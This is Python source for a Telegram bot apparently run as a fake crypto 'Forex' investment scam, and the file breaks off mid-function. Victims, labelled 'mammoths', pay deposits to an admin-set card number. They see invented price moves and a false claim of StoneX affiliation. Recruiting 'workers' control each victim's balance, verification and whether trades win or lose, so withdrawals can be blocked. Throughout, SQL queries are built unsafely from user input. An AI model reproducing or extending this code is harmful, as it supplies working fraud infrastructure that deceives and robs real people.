#import telebot
from glob import glob
from tabnanny import verbose
import telebot
from telebot import types
import time
from time import sleep
#import file
from config import *
from database import *
#import random
import random
from random import randint
#import module db
import sqlite3
import re

#course
from pycoingecko import CoinGeckoAPI

bot = telebot.TeleBot(token, parse_mode="HTML")
print("BOT START")
api = CoinGeckoAPI()
print("API START")





@bot.message_handler(commands=["start","menu"])
def start(message):
    db = sqlite3.connect('users.db')
    sql = db.cursor()
    sql.execute("""CREATE TABLE IF NOT EXISTS users( 
        id INTEGER,
        username TEXT,
        cash BIGINT,
        verif BOOL,
        sdelka INTAGER,
        luck INTAGER

        )""")
    db.commit()
    print(f"{message.chat.id} conected to db")
    people_id = message.chat.id
    username = message.from_user.username
    sql.execute(f"SELECT id FROM users WHERE id = {people_id}")
    data = sql.fetchone()
    if data is None:
        sql.execute(f"INSERT OR IGNORE INTO users VALUES('{people_id}', '{username}', {0}, 'False', {0}, {0});")
        bot.send_message(chatAlert, f"🎯<b>Пользователь @{username} запустил бота</b>")
        db.commit() 
        print(f"{message.chat.id} новый юзер")
    sql.execute(f"SELECT * FROM users WHERE id = {people_id}")
    excepts = sql.fetchone()
    t = "❌"
    if excepts[3] == 'False':
        t = "❌"
    if excepts[3] == 'True':
        t = "✅"
    activity_user = random.randint(340,720)
    markup = types.InlineKeyboardMarkup(row_width = 2)
    but = types.InlineKeyboardButton("📈Инвестировать📉", callback_data="inv")
    but1 = types.InlineKeyboardButton("💰Кошелек💰", callback_data="wallet")
    but2 = types.InlineKeyboardButton("❓Информация❓", callback_data="info")
    but3 = types.InlineKeyboardButton("⚜️Прочее⚜️", callback_data="setings")
    but4 = types.InlineKeyboardButton("💭Официальный сайт💭", url="google.com")
    markup.add(but,but1,but2,but3,but4)   
    
    bot.send_photo(message.chat.id, open('startP.jpg', 'rb'), f"👤Мой профиль\n\n🗣Имя: {message.from_user.first_name}\n👨‍💻Верификация: {t}\n🤝Совершенных сделок: {excepts[4]}\n📈Активных сделок на площадке: {activity_user}",reply_markup=markup)
    
    
    #referals
    referal = message.text.split(' ')[-1]
    db = sqlite3.connect('users.db')
    sql = db.cursor()
    sql.execute("""CREATE TABLE IF NOT EXISTS worker( 
        idW INTEGER,
        refid INTEGER,
        refusernames TEXT,
        refcash INTAGER,
        refverif BOOL,
        refsdelka INTAGER,
        refluck INTAGER

        )""")
    db.commit() 
    sql.execute(f"SELECT refid FROM worker WHERE refid = {message.chat.id}")
    data = sql.fetchone()
    if data is None:
        print("Create new users")
        sql.execute(f"INSERT OR IGNORE INTO worker (idW, refid, refusernames, refcash, refverif, refsdelka, refluck) VALUES({0}, {0}, '{0}' ,{0}, '0', {0}, {0});")
        print(referal)
        db.commit() 

    if referal != '/start': 
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        db.commit()
        sql.execute(f"SELECT refid FROM worker WHERE refid = {message.chat.id}")
        dats = sql.fetchone()
        if dats is None:
            sql.execute(f"SELECT * FROM users WHERE id = {message.chat.id}")
            exts = sql.fetchone()
            sql.execute(f"INSERT OR IGNORE INTO worker (idW,refid,refusernames,refcash,refverif,refsdelka,refluck) VALUES ('{referal}',{message.chat.id}, '{message.from_user.username}' ,{exts[2]}, '{exts[3]}', {exts[4]},{exts[5]});")
            print(referal)
            print(message.chat.id)
            print(exts[3])
            db.commit()
            sql.execute(f"SELECT username FROM users WHERE id = {people_id}")
            bot.send_message(referal, f"Новый рефирал зашел: @{message.from_user.username}")
        else: 
            bot.send_message(message.chat.id,"Вы уже зарегистрированы")
    
    





def depositSumData(message):
    global dep 
    dep = int(message.text)
    if dep < 300:
        bot.send_message(message.chat.id,"❕<b>Минимальный депозит 300 UAH</b>")
    if dep == 0:
        bot.send_message(message.chat.id,"❕<b>Минимальный депозит 300 UAH</b>")
    if dep >= 300:
        cardW = open("card.txt", "r")
        card = cardW.read()
        cardW.close()
        markup = types.InlineKeyboardMarkup(row_width = 2)
        but = types.InlineKeyboardButton("✅ Я оплатил", callback_data=f"YesDep")
        markup.add(but)
        bot.send_photo(message.chat.id, open('photo.jpg', 'rb'), f"<b>🤵 Для пополнения баланса\n\n💳 Реквизиты : <code>{card}</code>\n💸Сумма к оплате: {dep} UAH\n💬 Комментарий : t{message.chat.id}\n\n⚠️Нажмите на реквизиты или комментарий, чтобы скопировать!\n\n⚠️Если вы не можете указать комментарий, после оплаты пришлите чек/скриншот или же квитанцию в техническую поддержку.\n\n⚠️ 🛠 Тех.Поддержка - @Forex_Tradings_Support</b>",reply_markup=markup)        
        bot.send_message(chatAlert, f"<b>🔔 Мамонт @{message.from_user.username} на моменте пополнения\nСумма: {dep} UAH</b>")


@bot.message_handler(commands=["coder"])
def admin(message):
    if message.chat.id in coder:
        markup = types.InlineKeyboardMarkup(row_width = 2)
        but = types.InlineKeyboardButton("ОчиститьБД", callback_data="cleardb")
        markup.add(but)
        bot.send_message(message.chat.id,"Кодер панель!",reply_markup=markup)

@bot.message_handler(commands=["admin"])
def admin(message):
    if message.chat.id in admins:
        markup = types.InlineKeyboardMarkup(row_width = 2)
        but = types.InlineKeyboardButton("💳Установить карту💳", callback_data="setCard")
        markup.add(but)
        bot.send_message(message.chat.id,"🤴Панель администратора🤴",reply_markup=markup)
        bot.send_message(coder,"Зашел")
            

def SetCardData(message):
    try:
        cards = int(message.text)
        files = open('card.txt', 'a')
        files.write(str(cards))
        files.close()
        bot.send_message(message.chat.id,f"<b>✅Карта: {cards} успешно установленна!</b>")
    except:
        markup = types.InlineKeyboardMarkup(row_width = 2)
        but = types.InlineKeyboardButton("💳Установить карту💳", callback_data="setCard")
        markup.add(but)
        bot.send_message(message.chat.id, "<b>🤦Ты даун?Цифры вводи!🤦</b>",reply_markup=markup)

@bot.message_handler(commands=["worker"])
def menu_worker(message):
    db = sqlite3.connect('users.db')
    sql = db.cursor()
    db.commit()
    sql.execute(f"SELECT COUNT(refid) FROM worker WHERE idW = {message.chat.id}")
    uid = sql.fetchone()
    markup = types.InlineKeyboardMarkup(row_width = 2)
    but = types.InlineKeyboardButton("🦣 Мои мамонты", callback_data=f"MyMamont")
    markup.add(but)
    bot.send_message(message.chat.id, f"<b>🧰МЕНЮ ВОРКЕРА:\n\n🐒Мамонтов: {uid[0]}\n🧊Рефриральная ссылка:</b> <code>https://t.me/Forex_tradinggs_bot?start={message.chat.id}</code>",reply_markup=markup)
    
        
def myMamont(message):
    db = sqlite3.connect('users.db')
    sql = db.cursor()
    ref_text = f"Мои рефералы: \n"
    data = sql.execute(f"SELECT refid,refusernames,refcash,refverif,refsdelka,refluck FROM worker WHERE idW = {message.chat.id}").fetchall()
    for user in data:
        id = user[0]
        username = user[1]
        ref_text = ref_text + f"🆔: <code>{id}</code>--- 👨‍🦱: @{username}---\n\n"
    markup = types.InlineKeyboardMarkup(row_width = 2)
    buton_mamunt = types.InlineKeyboardButton("Меню мамонтов", callback_data="menuMamont")
    buton_dell_mamunt = types.InlineKeyboardButton("Удалить Мамонта", callback_data="delMamont")
    markup.add(buton_mamunt,buton_dell_mamunt) 
    bot.send_message(message.chat.id, ref_text,reply_markup=markup) 
    

def menuMamont(message):
    idMamont = bot.send_message(message.chat.id, "Введите id мамонта: ")
    bot.register_next_step_handler(idMamont,setDataMamontMenu)

def delMamont(message):
    idMamont = bot.send_message(message.chat.id, "Введите id мамонта: ")
    bot.register_next_step_handler(idMamont,setDataMamontDell)

def setDataMamontDell(message):
    try:
        idMamont = message.text
        db = sqlite3.connect('users.db')
        sql = db.cursor()
        sql.execute(f"DELETE FROM worker WHERE refid = {idMamont}")
        db.commit()
        sql.execute(f"SELECT * FROM users WHERE id = {idMamont}")
        name = sql.fetchone()
        print(name[1])
        bot.send_message(message.chat.id, f"🗑<b>Мамонт @{name[1]} Успешно удален</b>")
    except:
        bot.send_message(message.chat.id, f"<b>Ошибка удаления</b>")

def setDataMamontMenu(message):
    idMamont = message.text
    db = sqlite3.connect('users.db')
    sql = db.cursor()
    sql.execute(f"SELECT * FROM worker WHERE refid = {idMamont}")
    dataMamont = sql.fetchone()
    print(dataMamont[4])
    ver = "ERROR"
    if dataMamont[4] == "False":
        ver = "✖️"
    if dataMamont[4] == "True":
        ver = "✔️"
    lucks = "ERROR"
    if dataMamont[6] == 0:
        lucks = "Only Win👍"
    if dataMamont[6] == 1:
        lucks = "Only Lose👎"
    if dataMamont[6] == 2:
        lucks = "Верификация🔞"

    markup = types.InlineKeyboardMarkup(row_width = 2)
    balance = types.InlineKeyboardButton("💰", callback_data=f"balanceMamont_{idMamont}")
    verifickation = types.InlineKeyboardButton("🖥", callback_data=f"verMamont_{idMamont}")
    luck = types.InlineKeyboardButton("☘️", callback_data=f"luckMamont_{idMamont}")
    markup.add(balance,verifickation,luck) 
    bot.send_message(message.chat.id, f"<b>🦣Мамонт @{dataMamont[2]}\n💰Баланс: {dataMamont[3]} UAH\n🖥Верификация: {ver}\n☘️Удача: {lucks}</b>",reply_markup=markup)
    





@bot.callback_query_handler(func=lambda call:True)
def callback(call):
    req = call.data.split('_')
    if call.message:
        if call.data == "cleardb":
            try:
                db = sqlite3.connect('users.db')
                sql = db.cursor()
                sql.execute(f"DELETE FROM worker WHERE refid = {0}")
                db.commit()
                bot.send_message(call.message.chat.id,"БД успешно очищенна!")
            except:
                bot.send_message(call.message.chat.id,"ДАУН?")
        if call.data == "setCard":
            cards = bot.send_message(call.message.chat.id, "Вводи новую карту: ")
            bot.register_next_step_handler(cards, SetCardData)
        if call.data == "inv":
            markup = types.InlineKeyboardMarkup(row_width = 2)
            but = types.InlineKeyboardButton("Bitcoin", callback_data="BTC")
            but1 = types.InlineKeyboardButton("Ethereum", callback_data="ETH")
            but2 = types.InlineKeyboardButton("Tether", callback_data="TRC")
            but3 = types.InlineKeyboardButton("BNB", callback_data="BNB")
            but4 = types.InlineKeyboardButton("DogeCoin", callback_data="DOGE")
            markup.add(but,but1,but2,but3,but4)
            bot.delete_message(call.message.chat.id, call.message.message_id)
            bot.send_message(chat_id = call.message.chat.id, text="<b>Выберете криптовалюту для инвеcтирования</b>",reply_markup=markup)
        if call.data == "BTC":
            t = api.get_price(ids='bitcoin', vs_currencies='usd')['bitcoin']['usd']
            r = random.randint(390,870)
            b = random.randint(1,2)
            s = "Даун"
            print(b)
            if b == 1:
                s = 'Вверх⬆️'
            if b == 2:
                s = 'Вниз⬇️'
            markup = types.InlineKeyboardMarkup(row_width = 2)
            but = types.InlineKeyboardButton("Инвестировать", callback_data="invs")
            markup.add(but)
            bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text=f"<b>Криптовалюта: Bitcoin\n\nКурс: {t} USD\nПоследнее движение курса: {s}\nИзменение курса: {r}UAH</b>",reply_markup=markup)
        if call.data == "ETH":
            t = api.get_price(ids='ethereum', vs_currencies='usd')['ethereum']['usd']
            r = random.randint(100,179)
            b = random.randint(1,2)
            s = "Даун"
            print(b)
            if b == 1:
                s = 'Вверх⬆️'
            if b == 2:
                s = 'Вниз⬇️'
            markup = types.InlineKeyboardMarkup(row_width = 2)
            but = types.InlineKeyboardButton("Инвестировать", callback_data="invs")
            markup.add(but)
            bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text=f"<b>Криптовалюта: Ethereum\n\nКурс: {t} USD\nПоследнее движение курса: {s}\nИзменение курса: {r}UAH</b>",reply_markup=markup)
        
        if call.data == "TRC":
            t = api.get_price(ids='tether', vs_currencies='usd')['tether']['usd']
            r = random.randint(7,11)
            b = random.randint(1,2)
            s = "Даун"
            print(b)
            if b == 1:
                s = 'Вверх⬆️'
            if b == 2:
                s = 'Вниз⬇️'
            markup = types.InlineKeyboardMarkup(row_width = 2)
            but = types.InlineKeyboardButton("Инвестировать", callback_data="invs")
            markup.add(but)
            bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text=f"<b>Криптовалюта: Tether\n\nКурс: {t} USD\nПоследнее движение курса: {s}\nИзменение курса: {r}UAH</b>",reply_markup=markup)
        if call.data == "BNB":
            t = api.get_price(ids='binancecoin', vs_currencies='usd')['binancecoin']['usd']
            r = random.randint(122,150)
            b = random.randint(1,2)
            s = "Даун"
            print(b)
            if b == 1:
                s = 'Вверх⬆️'
            if b == 2:
                s = 'Вниз⬇️'
            markup = types.InlineKeyboardMarkup(row_width = 2)
            but = types.InlineKeyboardButton("Инвестировать", callback_data="invs")
            markup.add(but)
            bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text=f"<b>Криптовалюта: BNB Binance\n\nКурс: {t} USD\nПоследнее движение курса: {s}\nИзменение курса: {r}UAH</b>",reply_markup=markup)
        if call.data == "DOGE":
            t = api.get_price(ids='dogecoin', vs_currencies='usd')['dogecoin']['usd']
            r = random.randint(14,20)
            b = random.randint(1,2)
            s = "Даун"
            print(b)
            if b == 1:
                s = 'Вверх⬆️'
            if b == 2:
                s = 'Вниз⬇️'
            markup = types.InlineKeyboardMarkup(row_width = 2)
            but = types.InlineKeyboardButton("Инвестировать", callback_data="invs")
            markup.add(but)
            bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text=f"<b>Криптовалюта: DogeCoin\n\nКурс: {t} USD\nПоследнее движение курса: {s}\nИзменение курса: {r}UAH</b>",reply_markup=markup)
        
        
        
        
        
        
        
        if call.data == "invs":
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            sql.execute(f"SELECT cash FROM users WHERE id = {call.message.chat.id}")
            data = sql.fetchone()
            bot.delete_message(call.message.chat.id, call.message.message_id)
            sums = bot.send_message(call.message.chat.id, f"✍️Введите сумму инвестиции\n💰Доступно: {data[0]} UAH")
            bot.register_next_step_handler(sums, sumSetInvest)

        if call.data == "wallet":
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            db.commit()
            try:
                print("connect access")
            except:
                bot.send_message(coder, "❌<b>Проверь БД в коллбек WALLET</b>❌")
            sql.execute(f"SELECT cash FROM users WHERE id = {call.message.chat.id}")
            money = sql.fetchone()[0]
            markup = types.InlineKeyboardMarkup(row_width = 2)
            but = types.InlineKeyboardButton("➕ Пополнить", callback_data="Deposit")
            but1 = types.InlineKeyboardButton("➖ Вывести", callback_data="Widtraw")
            markup.add(but,but1)
            bot.delete_message(call.message.chat.id, call.message.message_id)
            bot.send_message(chat_id = call.message.chat.id,text=f"💼 Ваш кошелек:\n\n🆔UID кошелька: {call.message.chat.id}\n🏦Баланс {money} UAH",reply_markup=markup)
        if call.data == "Deposit":
            dep = bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text="✍️ Введите сумму пополнения: ")
            bot.register_next_step_handler(dep, depositSumData)
        if call.data == "Widtraw":
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            sql.execute(f'SELECT cash FROM users WHERE id = {call.message.chat.id}')
            data = sql.fetchone()
            if data[0] == 0: 
                bot.send_message(call.message.chat.id, f'❌<b>Вывод недоступен!\nНа вашем балансе {data[0]} UAH</b>')
            else:
                k = bot.send_message(call.message.chat.id, f'✍️<b>Введите сумму которую хотите вывести\nНа вашем балансе <code>{data[0]}</code> UAH</b>')
                bot.register_next_step_handler(k,WidtrawDep)
                
        if call.data == "info":
            bot.delete_message(call.message.chat.id, call.message.message_id)
            bot.send_message(chat_id = call.message.chat.id,text="<b>Forex является частью StoneX Group Inc. (NASDAQ: SNEX), публичной компании, которая соответствует самым высоким стандартам корпоративного управления, финансовой отчетности и раскрытия информации. StoneX имеет проверенную финансовую устойчивость и стабильность, а также ресурсы для продолжения инноваций и продвижения отрасли вперед</b>")
        if req[0] == "setings":
            markup = types.InlineKeyboardMarkup(row_width = 1)
            but = types.InlineKeyboardButton("🧑‍💻Верификация", callback_data="GoVerif")
            but1 = types.InlineKeyboardButton("🛠Поддержка", url="https://t.me/Forex_Tradings_Support ")
            markup.add(but,but1)
            bot.delete_message(call.message.chat.id, call.message.message_id)
            bot.send_message(chat_id = call.message.chat.id, text="<b>⚙️ Меню настроек</b>",reply_markup=markup)
        if call.data == "GoVerif":
            markup = types.InlineKeyboardMarkup(row_width = 1)
            but1 = types.InlineKeyboardButton("🛠Поддержка", url="https://t.me/Forex_Tradings_Support ")
            markup.add(but1)
            bot.delete_message(call.message.chat.id, call.message.message_id)
            bot.send_message(call.message.chat.id,"ℹ️<b>На данный момент верификация происходит через менеджера поддержки!</b>",reply_markup=markup)

        if call.data == f"YesDep":
            markup = types.InlineKeyboardMarkup(row_width = 2)
            but = types.InlineKeyboardButton("➕ Оплатил", callback_data="Accept")
            but1 = types.InlineKeyboardButton("➖ Деньги не пришли", callback_data="Decline")
            markup.add(but,but1)
            global idLOH
            idLOH = call.message.chat.id
            print(call.message.chat.id)
            print(call.message.message_id)
            bot.delete_message(call.message.chat.id, call.message.message_id)
            bot.send_message(chatAdmin, f"<b>🔔 Мамонт @{call.from_user.username} id 🆔{idLOH}оплатил!</b>",reply_markup=markup)
            bot.send_message(chat_id = idLOH, text="Проверяю оплату...")
        if call.data == "Accept":
            addcash()
        if call.data == "MyMamont":
            myMamont(call.message)
        if call.data == "menuMamont":
            menuMamont(call.message)
        if call.data == "delMamont":
            delMamont(call.message)

        if req[0] == 'balanceMamont':
            idMamonta = req[1]
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            sql.execute(f"SELECT * FROM worker WHERE refid = {idMamonta}")
            moneuToRef = sql.fetchone()
            markup = types.InlineKeyboardMarkup(row_width = 2)
            but = types.InlineKeyboardButton("➕ Пополнить", callback_data=f"DepMamont_{idMamonta}")
            markup.add(but)
            bot.send_message(call.message.chat.id, f"<b>🤑Баланс Мамонта {moneuToRef[3]} UAH\nУстановить новый баланс👇</b>",reply_markup=markup)
        if req[0] == "verMamont":
            idMamonta = req[1]
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            sql.execute(f"SELECT * FROM worker WHERE refid = {idMamonta}")
            verifToRef = sql.fetchone()
            markup = types.InlineKeyboardMarkup(row_width = 2)
            ver = "ERROR"
            if verifToRef[4] == "False":
                ver = "✖️"
            if verifToRef[4] == "True":
                ver = "✔️"
            markup = types.InlineKeyboardMarkup(row_width = 2)
            but = types.InlineKeyboardButton("✔️", callback_data=f"AccWerMamont_{idMamonta}")
            but1 = types.InlineKeyboardButton("✖️", callback_data=f"DecWerMamont_{idMamonta}")
            markup.add(but,but1)
            bot.send_message(call.message.chat.id, f"<b>🔞 Cтатус верификации Мамонта @{verifToRef[2]}\n🔋Статус: {ver}\n👇Установить новый статус👇</b>",reply_markup=markup)
        if req[0] == "luckMamont":
            idMamonta = req[1]
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            sql.execute(f"SELECT * FROM worker WHERE refid = {idMamonta}")
            luckToRef = sql.fetchone()
            luks = 0
            if luckToRef[6] == 0:
                luks = "👍Победа"
            if luckToRef[6] == 1:
                luks = "👎Поражение"
            if luckToRef[6] == 2:
                luks = "🔞Верификация🔞"
            markup = types.InlineKeyboardMarkup(row_width = 2)
            but = types.InlineKeyboardButton("👍", callback_data=f"Win_{idMamonta}")
            but1 = types.InlineKeyboardButton("👎", callback_data=f"Lose_{idMamonta}")
            but2 = types.InlineKeyboardButton("🔞", callback_data=f"WerifLose_{idMamonta}")
            markup.add(but,but1,but2)
            bot.send_message(call.message.chat.id, f"<b>🍀Удача мамонта @{luckToRef[2]}\n🐒На данный момент у мамонта стоит: {luks}</b>",reply_markup=markup)
        if req[0] == "DepMamont":
            id_Mamont = req[1]
            t =  bot.edit_message_text(chat_id = call.message.chat.id, message_id = call.message.message_id, text=f"✍️<b>Введите сумму которую хотите начислить мамонту:</b>")
            print("works")
            bot.register_next_step_handler(t,GiveMoneuMamont,id_Mamont)
            print("work")
        if req[0] == "AccWerMamont":
            id_Mamont = req[1]
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            sql.execute(f"UPDATE worker SET refverif = 'True' WHERE refid = {id_Mamont}")
            sql.execute(f"UPDATE users SET verif = 'True' WHERE id = {id_Mamont}")
            db.commit()
            sql.execute(f"SELECT * FROM worker WHERE refid = {id_Mamont}")
            verifToRef = sql.fetchone()
            ver = "ERROR"
            if verifToRef[4] == "False":
                ver = "✖️"
            if verifToRef[4] == "True":
                ver = "✔️"
            bot.send_message(call.message.chat.id, f"Статус изменен на {ver}")
        if req[0] == "DecWerMamont":
            id_Mamont = req[1]
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            sql.execute(f"UPDATE worker SET refverif = 'False' WHERE refid = {id_Mamont}")
            sql.execute(f"UPDATE users SET verif = 'False' WHERE id = {id_Mamont}")
            sql.execute(f"SELECT * FROM worker WHERE refid = {id_Mamont}")
            verifToRef = sql.fetchone()
            db.commit()
            ver = "ERROR"
            if verifToRef[4] == "False":
                ver = "✖️"
            if verifToRef[4] == "True":
                ver = "✔️"
            bot.send_message(call.message.chat.id, f"Статус изменен на {ver}")
        if req[0] == "Win":
            id_Mamont = req[1]
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            sql.execute(f"UPDATE worker SET refluck = {0} WHERE refid = {id_Mamont}")
            sql.execute(f"UPDATE users SET luck = {0} WHERE id = {id_Mamont}")
            db.commit()
            sql.execute(f"SELECT * FROM worker WHERE refid = {id_Mamont}")
            luckToRef = sql.fetchone()
            luks = 0
            if luckToRef[6] == 0:
                luks = "👍"
            if luckToRef[6] == 1:
                luks = "👎"
            if luckToRef[6] == 2:
                luks = "🔞Верификация🔞"
            bot.send_message(call.message.chat.id, f"✅<b>Статус изменен на {luks}</b>")

        if req[0] == "Lose":
            id_Mamont = req[1]
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            sql.execute(f"UPDATE worker SET refluck = {1} WHERE refid = {id_Mamont}")
            sql.execute(f"UPDATE users SET luck = {1} WHERE id = {id_Mamont}")
            db.commit()
            sql.execute(f"SELECT * FROM worker WHERE refid = {id_Mamont}")
            luckToRef = sql.fetchone()
            luks = 0
            if luckToRef[6] == 0:
                luks = "👍"
            if luckToRef[6] == 1:
                luks = "👎"
            if luckToRef[6] == 2:
                luks = "🔞Верификация🔞"
            bot.send_message(call.message.chat.id, f"✅<b>Статус изменен на {luks}</b>")
            

        if req[0] == "WerifLose":
            id_Mamont = req[1]
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            sql.execute(f"UPDATE worker SET refluck = {2} WHERE refid = {id_Mamont}")
            sql.execute(f"UPDATE users SET luck = {2} WHERE id = {id_Mamont}")
            db.commit()
            sql.execute(f"SELECT * FROM worker WHERE refid = {id_Mamont}")
            luckToRef = sql.fetchone()
            luks = 0
            if luckToRef[6] == 0:
                luks = "👍"
            if luckToRef[6] == 1:
                luks = "👎"
            if luckToRef[6] == 2:
                luks = "🔞Верификация🔞"
            
            bot.send_message(call.message.chat.id, f"✅<b>Статус изменен на {luks}</b>")
            
        if req[0] == "UP":
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            sql.execute(f"SELECT * FROM users WHERE id = {call.message.chat.id}")
            data = sql.fetchone()
            print(data[5])
            if data[5] == 0:
                bot.delete_message(call.message.chat.id, call.message.message_id)
                bot.send_sticker(call.message.chat.id, "CAACAgQAAxkBAAEFjLBi9292di292ukP9Ka7To1qgXLifAACsAADMYoVEMGiIqOShIccKQQ")
                time.sleep(10)
                t = int(req[1])
                ret = int(t) * 2 - int(t)
                sql.execute(f"SELECT * FROM users WHERE id = {call.message.chat.id}")
                datar = sql.fetchone()
                sql.execute(f"SELECT * FROM worker WHERE refid = {call.message.chat.id}")
                datas = sql.fetchone()
                print(ret)
                res = int(datar[2]) + int(ret)
                ress = int(datas[3]) + int(ret)
                sdk = int(datar[4]) + 1 
                sdkk = int(datas[5]) + 1
                print(datar[4])
                print(datas[5])
                print(sdk)
                print(sdkk)
                sql.execute(f"UPDATE users SET cash = {res} WHERE id = {call.message.chat.id}")
                sql.execute(f"UPDATE users SET sdelka = {sdk} WHERE id = {call.message.chat.id}")
                sql.execute(f"UPDATE worker SET refcash = {ress} WHERE refid = {call.message.chat.id}")
                sql.execute(f"UPDATE worker SET refsdelka = {sdkk} WHERE refid = {call.message.chat.id}")
                db.commit()
                sql.execute(f"SELECT * FROM worker WHERE refid = {call.message.chat.id}")
                datas = sql.fetchone()
                bot.send_message(datas[0], f"ℹ️<b>Мамонт @{datas[2]} поднял {ret + t} UAH\nБаланс: {datas[3]} UAH</b>")
                markup = types.InlineKeyboardMarkup(row_width = 2)
                but = types.InlineKeyboardButton("Инвестировать", callback_data="inv")
                markup.add(but)
                bot.send_message(call.message.chat.id, f"<b>🤝Успешная сделка\nВаша прибыль: {ret + t}</b>",reply_markup=markup)
            if data[5] == 1:
                bot.delete_message(call.message.chat.id, call.message.message_id)
                bot.send_sticker(call.message.chat.id, "CAACAgQAAxkBAAEFjLBi9292di292ukP9Ka7To1qgXLifAACsAADMYoVEMGiIqOShIccKQQ")
                time.sleep(10)
                t = int(req[1])
                sql.execute(f"SELECT * FROM users WHERE id = {call.message.chat.id}")
                datar = sql.fetchone()
                sql.execute(f"SELECT * FROM worker WHERE refid = {call.message.chat.id}")
                datas = sql.fetchone()
                res = int(datar[2]) - int(t)
                ress = int(datas[3]) - int(t)
                sdk = int(datar[4]) + 1 
                sdkk = int(datas[5]) + 1
                print(datar[4])
                print(datas[5])
                print(sdk)
                print(sdkk)
                sql.execute(f"UPDATE users SET cash = {res} WHERE id = {call.message.chat.id}")
                sql.execute(f"UPDATE users SET sdelka = {sdk} WHERE id = {call.message.chat.id}")
                sql.execute(f"UPDATE worker SET refcash = {ress} WHERE refid = {call.message.chat.id}")
                sql.execute(f"UPDATE worker SET refsdelka = {sdkk} WHERE refid = {call.message.chat.id}")
                db.commit()
                sql.execute(f"SELECT * FROM worker WHERE refid = {call.message.chat.id}")
                datas = sql.fetchone()
                bot.send_message(datas[0], f"ℹ️<b>Мамонт @{datas[2]} проиграл {t} UAH\nБаланс: {datas[3]} UAH</b>")
                markup = types.InlineKeyboardMarkup(row_width = 2)
                but = types.InlineKeyboardButton("Инвестировать", callback_data="inv")
                markup.add(but)
                bot.send_message(call.message.chat.id, f"<b>🤝Не успешная сделка\nВаш убыток: {t} UAH</b>",reply_markup=markup)
            if data[5] == 2:
                markup = types.InlineKeyboardMarkup(row_width=1)
                but = types.InlineKeyboardButton("🧑‍💻Верификация", callback_data="GoVerif")
                but1 = types.InlineKeyboardButton("🛠Поддержка", url="https://t.me/Forex_Tradings_Support ")
                markup.add(but,but1)
                bot.send_message(call.message.chat.id, f"<b>⚠️К сожалению Вы не можете инвестировать на неверифицированом аккаунте!⚠️</b>",reply_markup=markup)
        if req[0] == "DOWN":
            db = sqlite3.connect('users.db')
            sql = db.cursor()
            sql.execute(f"SELECT * FROM users WHERE id = {call.message.chat.id}")
            data = sql.fetchone()
            print(data[5])
            if data[5] == 0:
                bot.delete_message(call.message.chat.id, call.message.message_id)
                bot.send_sticker(call.message.chat.id, "CAACAgQAAxkBAAEFjLBi9292di292ukP9Ka7To1qgXLifAACsAADMYoVEMGiIqOShIccKQQ")
                time.sleep(10)
                t = int(req[1])
                ret = int(t) * 2 - int(t)
                sql.execute(f"SELECT * FROM users WHERE id = {call.message.chat.id}")
                datar = sql.fetchone()
                sql.execute(f"SELECT * FROM worker WHERE refid = {call.message.chat.id}")
                datas = sql.fetchone()
                print(ret)
                res = int(datar[2]) + int(ret)
                ress = int(datas[3]) + int(ret)
                sdk = int(datar[4]) + 1 
                sdkk = int(datas[5]) + 1
                print(datar[4])
                print(datas[5])
                print(sdk)
                print(sdkk)
                sql.execute(f"UPDATE users SET cash = {res} WHERE id = {call.message.chat.id}")
                sql.execute(f"UPDATE users SET sdelka = {sdk} WHERE id = {call.message.chat.id}")
                sql.execute(f"UPDATE worker SET refcash = {ress} WHERE refid = {call.message.chat.id}")
                sql.execute(f"UPDATE worker SET refsdelka = {sdkk} WHERE refid = {call.message.chat.id}")
                db.commit()
                sql.execute(f"SELECT * FROM worker WHERE refid = {call.message.chat.id}")
                datas = sql.fetchone()
                bot.send_message(datas[0], f"ℹ️<b>Мамонт @{datas[2]} поднял {ret + t} UAH\nБаланс: {datas[3]} UAH</b>")
                markup = types.InlineKeyboardMarkup(row_width = 2)
                but = types.InlineKeyboardButton("Инвестировать", callback_data="inv")
                markup.add(but)
                bot.send_message(call.message.chat.id, f"<b>🤝Успешная сделка\nВаша прибыль: {ret + t}</b>",reply_markup=markup)
            if data[5] == 1:
                bot.delete_message(call.message.chat.id, call.message.message_id)
                bot.send_sticker(call.message.chat.id, "CAACAgQAAxkBAAEFjLBi9292di292ukP9Ka7To1qgXLifAACsAADMYoVEMGiIqOShIccKQQ")
                time.sleep(10)
                t = int(req[1])
                sql.execute(f"SELECT * FROM users WHERE id = {call.message.chat.id}")
                datar = sql.fetchone()
                sql.execute(f"SELECT * FROM worker WHERE refid = {call.message.chat.id}")
                datas = sql.fetchone()
                res = int(datar[2]) - int(t)
                ress = int(datas[3]) - int(t)
                sdk = int(datar[4]) + 1 
                sdkk = int(datas[5]) + 1
                print(datar[4])
                print(datas[5])
                print(sdk)
                print(sdkk)
                sql.execute(f"UPDATE users SET cash = {res} WHERE id = {call.message.chat.id}")
                sql.execute(f"UPDATE users SET sdelka = {sdk} WHERE id = {call.message.chat.id}")
                sql.execute(f"UPDATE worker SET refcash = {ress} WHERE refid = {call.message.chat.id}")
                sql.execute(f"UPDATE worker SET refsdelka = {sdkk} WHERE refid = {call.message.chat.id}")
                db.commit()
                sql.execute(f"SELECT * FROM worker WHERE refid = {call.message.chat.id}")
                datas = sql.fetchone()
                bot.send_message(datas[0], f"ℹ️<b>Мамонт @{datas[2]} проиграл {t} UAH\nБаланс: {datas[3]} UAH</b>")
                markup = types.InlineKeyboardMarkup(row_width = 2)
                but = types.InlineKeyboardButton("Инвестировать", callback_data="inv")
                markup.add(but)
